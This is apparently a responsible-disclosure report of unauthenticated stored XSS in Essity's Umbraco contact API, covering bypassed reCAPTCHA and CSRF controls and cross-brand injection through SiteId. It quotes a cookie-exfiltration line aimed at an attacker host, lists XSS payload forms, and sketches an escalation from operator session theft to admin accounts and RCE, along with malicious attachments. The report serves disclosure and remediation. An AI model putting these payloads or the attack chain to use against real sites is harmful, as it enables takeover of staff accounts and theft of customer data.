## Vulnerability Details

## Summary

The Essity customer contact API (`ContactApi.SavePersonalContactExtended` and `SaveProductContactExtended`) accepts unauthenticated ticket submissions with arbitrary HTML/JavaScript in 12+ fields, bypassing reCAPTCHA validation, CSRF protection, and rate limiting. When customer-service operators view these tickets in the Umbraco back-office, the stored XSS executes in their authenticated session, enabling account takeover, code execution, and cross-tenant attacks against sibling Essity brands.

## Target Endpoints

- `POST https://████████/Umbraco/Api/ContactApi/SavePersonalContactExtended/`
- `POST https://████████/Umbraco/Api/ContactApi/SaveProductContactExtended/`
- `POST https://████████/Umbraco/Api/ContactApi/SaveAttachment`

Reachable on all in-scope locale paths: `/at`, `/bg`, `/cz`, `/de`, `/ee`, `/gr`, `/hr`, `/hu`, `/lt`, `/lv`, `/ro`, `/rs`, `/ru`, `/ua`, and root `https://zewa.net/`.

## Stacked Vulnerabilities

| # | Control | Status |
|---|---------|--------|
| 1 | reCAPTCHA v2 verification | Server accepts empty `ReCaptcha=` parameter; validation is client-side only |
| 2 | CSRF token | None present; endpoint accepts requests with zero cookies |
| 3 | Origin/Referer check | None; `Access-Control-Allow-Origin: *` permits cross-origin attacks |
| 4 | Input sanitization | None; `<script>`, `<img onerror>`, `<svg onload>`, `javascript:` URIs accepted in all text fields |
| 5 | Email validation | Broken; `"<script>alert(1)</script>"@a.com` accepted |
| 6 | Rate limiting | None; 8 tickets submitted in 2 seconds, all successful |
| 7 | SiteId authorization | Not enforced; any tenant ID accepted, enabling cross-brand attacks |
| 8 | Attachment authorization | Not enforced; unauthenticated uploads immediately referenceable in tickets |

An attacker targeting only `████████` can inject XSS into the customer-service back-office of any sibling brand by changing the `SiteId` parameter.

## Technical Details

**Stack:** ASP.NET Core MVC + Umbraco CMS (build hash `639140017071417623`), Cloudflare CDN (no bot challenge on this path)

**Why existing controls fail:**
- reCAPTCHA token is collected client-side but never validated server-side
- Honeypot field `contact_me_by_fax_only=1` is documented in public JS; bots already include it
- Cloudflare is configured for CDN, not bot management; 30+ requests from one IP triggered no challenge

**Vulnerable fields (12 total):**
FirstName, LastName, Email, CompareEmail, Address, City, Country, Message, Phone, Question, ProductConcerned, CoreCode, Store, PageUrl, Referrer, SourceTags, UserAgent

## Impact

## Back-Office Account Takeover

When an operator opens a malicious ticket in the Umbraco back-office, the stored XSS executes with their privileges (typically Editor, Writer, Translator, or Administrator roles). The attacker can:

1. **Exfiltrate session credentials**: Steal cookies, anti-XSRF tokens via `fetch('https://attacker.tld/?c='+document.cookie)`
2. **Create administrator accounts**: Call `/umbraco/management/api/v1/...` or `/umbraco/backoffice/UmbracoApi/...` endpoints in the operator's context
3. **Install malicious packages**: Upload and execute Umbraco packages containing server-side code, achieving RCE on the CMS host serving 14+ brand sites
4. **Modify content**: Alter published pages, member data, or site configuration

The operator dependency is not a meaningful barrier—reviewing inbound customer messages is the operator's primary job function, guaranteeing payload execution.

## Mass Ticket Injection from Any Browser

`Access-Control-Allow-Origin: *` combined with no cookie requirement enables drive-by attacks:
- Malicious ad or compromised page can submit tickets from every visitor's browser
- Attacker's IP is invisible (requests originate from legitimate visitors)
- No rate limiting allows flooding the ticket queue in minutes

## Phishing Pipeline to Internal Staff

The attachment chain delivers attacker-controlled files into the operator's workflow:
- **Malicious PDFs** with JavaScript `OpenAction` execute when opened in Acrobat
- **Office documents** with macros run code on internal workstations
- **ZIP archives** containing LNK/EXE payloads for lateral movement

File validation checks magic bytes for images but accepts PDF/DOCX/ZIP by extension only, confirmed with PoC PDF containing `app.alert(1)`.

## Cross-Brand Attack Surface

A single attacker targeting `████████` can inject XSS into customer-service systems for multiple Essity brands (Lotus, Cushelle, Colhogar, Edet, papelregio) by manipulating the `SiteId` parameter. This creates:
- **Operational disruption** across multiple brand support teams
- **Reputational damage** spanning the entire Essity portfolio
- **Investigation complexity** when malicious tickets appear to originate from legitimate brand domains

## GDPR Article 32 Breach

Marketing consent flags (`ProvidedConsumerConsents[i][IsChecked]`) are accepted server-side with no verification. Attackers can:
- Create subscriptions in victims' names without consent
- Prevent Essity from demonstrating valid consent under Article 7
- Trigger data protection liability for every persisted fake subscription

**CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:L** → **9.0 Critical**

- **Attack Vector: Network** - Remotely exploitable from any internet connection
- **Attack Complexity: Low** - No special preparation beyond standard HTTP requests
- **Privileges Required: None** - Completely unauthenticated
- **User Interaction: Required** - Operator must open the ticket (guaranteed by job function)
- **Scope: Changed** - XSS executes in privileged back-office context, different from anonymous submission context
- **Confidentiality: High** - Access to operator session, customer PII, internal CRM data
- **Integrity: High** - Ability to modify CMS content, create accounts, install code
- **Availability: Low** - Ticket flood can disrupt support operations but not destroy the platform
